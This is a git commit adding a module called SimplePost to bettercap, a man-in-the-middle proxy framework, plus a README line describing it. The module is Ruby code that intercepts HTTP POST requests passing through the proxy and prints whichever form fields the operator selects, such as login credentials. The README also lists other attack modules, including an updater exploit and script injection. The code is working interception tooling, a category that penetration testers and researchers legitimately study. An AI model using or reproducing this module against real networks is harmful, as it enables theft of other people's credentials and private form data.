ffda2d3f24e7cf07395542f0761e1d2afbd3af6d
evilsocket <evilsocket@gmail.com>
2016-05-26 14:23:09 +0200

    New SimplePost module.

--- README.md
+++ README.md
@@ -6,6 +6,7 @@ This repository contains some [bettercap](http://www.bettercap.org/) transparent
 * http/**osxsparkle.rb** - Will execute a custom Mach-O OSX executable on each OSX machine exploiting the Sparkle Updater vulnerability https://vulnsec.com/2016/osx-apps-vulnerabilities/ .
 * http/**beefbox.rb** - Similar to injectjs but specialized to work with the [BeEF framework](http://beefproject.com).
 * http/**debug.rb** - Debug HTTP requests and responses.
+* http/**simple_post.rb** - Intercept and display only selected POST fields.
 * http/**location_hijacking.rb**  - Hijack Location header with custom URL.
 * http/**replace_images.rb** - Replace all images with a custom one.
 * http/**rickroll.rb** - Inject an iframe with the (in)famous RickRoll video in autoplay mode.
---
+++ http/simple_post.rb
@@ -0,0 +1,47 @@
+=begin
+
+BETTERCAP
+
+Author : Simone 'evilsocket' Margaritelli
+Email  : evilsocket@gmail.com
+Blog   : http://www.evilsocket.net/
+
+This project is released under the GPL 3 license.
+
+=end
+class SimplePost < BetterCap::Proxy::HTTP::Module
+  meta(
+    'Name'        => 'SimplePost',
+    'Description' => 'Intercept and display only selected POST fields.',
+    'Version'     => '1.0.0',
+    'Author'      => "Simone 'evilsocket' Margaritelli",
+    'License'     => 'GPL3'
+  )
+
+  @@fields = nil
+
+  def self.on_options(opts)
+    opts.on( '--simple-post-fields FIELD1,FIELD2', 'Comma separated list of POST fields to capture.' ) do |v|
+      @@fields = v.split(',').map(&:strip).reject(&:empty?)
+    end
+  end
+
+  def initialize
+    raise BetterCap::Error, "No --simple-post-fields option specified for the proxy module." if @@fields.nil?
+  end
+
+  def on_request( request, response )
+    if request.post? and !request.body.nil? and !request.body.empty?
+      msg = ''
+      request.body.split('&').each do |v|
+        name, value = v.split('=')
+        name ||= ''
+        value ||= ''
+        if @@fields.include?(name)
+          msg << "  #{name.blue} : #{URI.unescape(value).yellow}\n"
+        end
+      end
+      BetterCap::Logger.raw "\n#{msg}\n"
+    end
+  end
+end
